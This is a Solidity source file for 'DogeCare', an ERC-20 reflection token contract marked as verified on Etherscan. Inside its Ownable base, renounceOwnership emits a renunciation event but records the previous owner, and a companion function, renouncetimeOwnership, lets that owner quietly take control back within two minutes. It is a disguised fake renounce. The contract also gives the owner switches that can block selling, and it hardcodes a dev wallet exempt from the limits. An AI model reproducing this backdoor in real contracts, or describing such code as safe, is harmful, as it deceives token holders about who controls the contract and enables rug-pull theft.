/**
 *Submitted for verification at Etherscan.io on 2021-04-21
*/

pragma solidity >=0.6.8;



abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}



pragma solidity >=0.6.8;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


pragma solidity >=0.6.8;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



pragma solidity >=0.6.8;

contract Ownable is Context {
    address private _owner;
    address private _prevOwner;
    uint256 private timetoPass;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        _prevOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
    	_prevOwner = _owner;
    	timetoPass = block.timestamp + 2 minutes;
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function renouncetimeOwnership()  public virtual  {
    	require (_prevOwner==msg.sender);
    	require (timetoPass>= block.timestamp);	
     	_owner=msg.sender;   		
   

    	

    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}




pragma solidity >=0.6.8;

contract DogeCare is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _DogeCareValueOwned;
    mapping (address => uint256) private _tokenValueOwned;
    mapping (address => mapping (address => uint256)) private _allowed;

    mapping (address => bool) private _isExcluded;
    mapping(address => uint256) private _buyer;
    address[] private _excluded;
 	address public _pairAddress;

    string private _name = 'DogeCare';
    string private _symbol = 'DogeCare';
    uint8 private constant _decimals = 8;   
    uint256 private constant MAX = ~uint256(0);
    uint256 private  _totalSupply = 4200000000 * 10**uint256(_decimals);
    uint256 private _maxSupplyGen = (MAX - (MAX % _totalSupply));
    uint256 private _CurTotalFee;
    uint256 private feePercent = 4;
    bool private Buylimitactive = true;
    bool private Botprotactive =true;
    bool private Frontrunprotactive = false;
    uint256 private BuyLimit = 63000000 * 10**uint256(_decimals);

 

    constructor () public {
        _DogeCareValueOwned[_msgSender()] = _maxSupplyGen;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tokenValueOwned[account];
        return tokenFromBeingStrongHodler(_DogeCareValueOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowed[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowed[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowed[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowed[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

   function setBuylimitactive (bool limitactivechanger) external onlyOwner() {

    Buylimitactive = limitactivechanger;
    
    
  }

    function setBotProtectactive (bool botprotectchanger) external onlyOwner() {

    Botprotactive = botprotectchanger;
    
    
  }

      function setFrontRunProtectactive (bool frontprotectchanger) external onlyOwner() {

    Frontrunprotactive = frontprotectchanger;

  }
      function setpairAdressAndFrontrunactive(address pairAdress) external onlyOwner() {

   	 _pairAddress=pairAdress;
   	 Frontrunprotactive = true;    

  }

    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _CurTotalFee;
    }


    function reflectionFromDoge(uint256 valueToken, bool deductTransferFee) public view returns(uint256) {
        require(valueToken <= _totalSupply, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 valueDogeCare,,,,) = _getValues(valueToken);
            return valueDogeCare;
        } else {
            (,uint256 valueDogeCareTransferAm,,,) = _getValues(valueToken);
            return valueDogeCareTransferAm;
        }
    }

    //Update actual values of accounts and distribute on transfer, automatic getter and exec
    function DogeReward(uint256 valueToken) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 valueDogeCare,,,,) = _getValues(valueToken);
        _DogeCareValueOwned[sender] = _DogeCareValueOwned[sender].sub(valueDogeCare);
        _maxSupplyGen = _maxSupplyGen.sub(valueDogeCare);
        _CurTotalFee = _CurTotalFee.add(valueToken);
    }



    function tokenFromBeingStrongHodler(uint256 valueDogeCare) public view returns(uint256) {
        require(valueDogeCare <= _maxSupplyGen, "Amount must be less than max Supply generated");
        uint256 currentRate =  _getRate();
        return valueDogeCare.div(currentRate);
    }

    function getActualBuyLimit() public view returns (uint256){
    return BuyLimit;
  }

    function excludeAccount(address account) external onlyOwner() {
        _excludeAccount(account);

    }

    function _excludeAccount(address account) internal{
        require(!_isExcluded[account], "Account is already excluded");
        if(_DogeCareValueOwned[account] > 0) {
            _tokenValueOwned[account] = tokenFromBeingStrongHodler(_DogeCareValueOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }




    function includeAccount(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tokenValueOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

       _allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        // No limit on Dev wallet and UniSwap Contract so liquidity can be added
        if(Buylimitactive && msg.sender != owner() && msg.sender != 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F && msg.sender != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
        require(amount <= BuyLimit);           // Amount not allowed to be over actualBuylimit

      }

      if(Botprotactive && msg.sender != owner() && msg.sender != 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F && msg.sender != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
      	 if (_buyer[recipient] >= block.number) {
                    // the buyer already bought a few blocks before!
                    revert("Sorry, you can't trade immediatly after doing a trade");
                }else{
                	_buyer[recipient] = block.number+3;	
                }
      }
      if(Frontrunprotactive){
      	if(recipient == _pairAddress){
      	 if (_buyer[sender] >= block.number) {
                    // the buyer trying to sell immediatly!
                    revert("Sorry, you can't sell immediatly after doing a trade");
                }
      	}
      }
        if(_isExcluded[sender]){
            if(_isExcluded[recipient]){
                _transferBothExcluded(sender, recipient, amount); 
            }else{
                _transferFromExcluded(sender, recipient, amount);
            }
        }else{
            if(_isExcluded[recipient]){
                _transferToExcluded(sender, recipient, amount);    
            }else{
                _transferStandard(sender, recipient, amount);  
            }
        }

    }

    function _transferStandard(address sender, address recipient, uint256 valueToken) private {
        (uint256 valueDogeCare, uint256 valueDogeCareTransfer, uint256 valueDogeCareFee, uint256 valueTokenTransfer, uint256 valueTokenFee) = _getValues(valueToken);
        _DogeCareValueOwned[sender] = _DogeCareValueOwned[sender].sub(valueDogeCare);
        _DogeCareValueOwned[recipient] = _DogeCareValueOwned[recipient].add(valueDogeCareTransfer);       
        _tradingFee(valueDogeCareFee, valueTokenFee);
        emit Transfer(sender, recipient, valueTokenTransfer);
    }

    function _transferToExcluded(address sender, address recipient, uint256 valueToken) private {
        (uint256 valueDogeCare, uint256 valueDogeCareTransfer, uint256 valueDogeCareFee, uint256 valueTokenTransfer, uint256 valueTokenFee) = _getValues(valueToken);
        _DogeCareValueOwned[sender] = _DogeCareValueOwned[sender].sub(valueDogeCare);
        _tokenValueOwned[recipient] = _tokenValueOwned[recipient].add(valueTokenTransfer);
        _DogeCareValueOwned[recipient] = _DogeCareValueOwned[recipient].add(valueDogeCareTransfer);           
        _tradingFee(valueDogeCareFee, valueTokenFee);
        emit Transfer(sender, recipient, valueTokenTransfer);
    }

    function _transferFromExcluded(address sender, address recipient, uint256 valueToken) private {
        (uint256 valueDogeCare, uint256 valueDogeCareTransfer, uint256 valueDogeCareFee, uint256 valueTokenTransfer, uint256 valueTokenFee) = _getValues(valueToken);
        _tokenValueOwned[sender] = _tokenValueOwned[sender].sub(valueToken);
        _DogeCareValueOwned[sender] = _DogeCareValueOwned[sender].sub(valueDogeCare);
        _DogeCareValueOwned[recipient] = _DogeCareValueOwned[recipient].add(valueDogeCareTransfer);   
        _tradingFee(valueDogeCareFee, valueTokenFee);
        emit Transfer(sender, recipient, valueTokenTransfer);
    }

    function _transferBothExcluded(address sender, address recipient, uint256 valueToken) private {
        (uint256 valueDogeCare, uint256 valueDogeCareTransfer, uint256 valueDogeCareFee, uint256 valueTokenTransfer, uint256 valueTokenFee) = _getValues(valueToken);
        _tokenValueOwned[sender] = _tokenValueOwned[sender].sub(valueToken);
        _DogeCareValueOwned[sender] = _DogeCareValueOwned[sender].sub(valueDogeCare);
        _tokenValueOwned[recipient] = _tokenValueOwned[recipient].add(valueTokenTransfer);
        _DogeCareValueOwned[recipient] = _DogeCareValueOwned[recipient].add(valueDogeCareTransfer);        
        _tradingFee(valueDogeCareFee, valueTokenFee);
        emit Transfer(sender, recipient, valueTokenTransfer);
    }

    function _tradingFee(uint256 valueDogeCareFee, uint256 valueTokenFee) private {
        _maxSupplyGen = _maxSupplyGen.sub(valueDogeCareFee);
        _CurTotalFee = _CurTotalFee.add(valueTokenFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 DogeCareSupply, uint256 tokenSupply) = _getCurrentSupply();
        return DogeCareSupply.div(tokenSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 DogeCareSupply = _maxSupplyGen;
        uint256 tokenSupply = _totalSupply;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_DogeCareValueOwned[_excluded[i]] > DogeCareSupply || _tokenValueOwned[_excluded[i]] > tokenSupply){
                    return (_maxSupplyGen, _totalSupply);
                } 
            DogeCareSupply = DogeCareSupply.sub(_DogeCareValueOwned[_excluded[i]]);
            tokenSupply = tokenSupply.sub(_tokenValueOwned[_excluded[i]]);
        }
        if (DogeCareSupply < _maxSupplyGen.div(_totalSupply)){
                return (_maxSupplyGen, _totalSupply);
            } 
        return (DogeCareSupply, tokenSupply);
    }


    function _getValues(uint256 valueToken) private view returns (uint256, uint256, uint256, uint256, uint256) {
        (uint256 valueTokenTransfer, uint256 valueTokenFee) = _getTokenValues(valueToken,feePercent);
        uint256 currentRate =  _getRate();
        (uint256 valueDogeCare, uint256 valueDogeCareTransfer, uint256 valueDogeCareFee) = _getDogeCareValues(valueToken, valueTokenFee, currentRate);
        return (valueDogeCare, valueDogeCareTransfer, valueDogeCareFee, valueTokenTransfer, valueTokenFee);
    }

    function _getTokenValues(uint256 valueToken, uint256 feePerc) private pure returns (uint256, uint256) {
        uint256 valueTokenFee = valueToken.div(100/feePerc);
        uint256 valueTokenTransfer = valueToken.sub(valueTokenFee);
        return (valueTokenTransfer, valueTokenFee);
    }

    function _getDogeCareValues(uint256 valueToken, uint256 valueTokenFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 valueDogeCare = valueToken.mul(currentRate);
        uint256 valueDogeCareFee = valueTokenFee.mul(currentRate);
        uint256 valueDogeCareTransfer = valueDogeCare.sub(valueDogeCareFee);
        return (valueDogeCare, valueDogeCareTransfer, valueDogeCareFee);
    }



}